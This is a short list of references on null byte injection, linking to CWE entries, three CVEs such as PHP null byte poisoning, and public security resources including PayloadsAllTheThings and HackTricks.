- [CWE-158: Improper Neutralization of Null Byte](https://cwe.mitre.org/data/definitions/158.html)
- [CWE-626: Null Byte Interaction Error](https://cwe.mitre.org/data/definitions/626.html)
- [CVE-2006-7243: PHP Null Byte Poisoning](https://nvd.nist.gov/vuln/detail/CVE-2006-7243)
- [CVE-2009-2408: SSL Certificate Null Byte Attack](https://nvd.nist.gov/vuln/detail/CVE-2009-2408)
- [CVE-2007-0450: Tomcat UTF-8 Overlong Encoding](https://nvd.nist.gov/vuln/detail/CVE-2007-0450)
- [PayloadsAllTheThings — Null Byte](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks — File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)
- [Snyk — Null Byte Injection Research](https://snyk.io/blog/null-byte-injection/)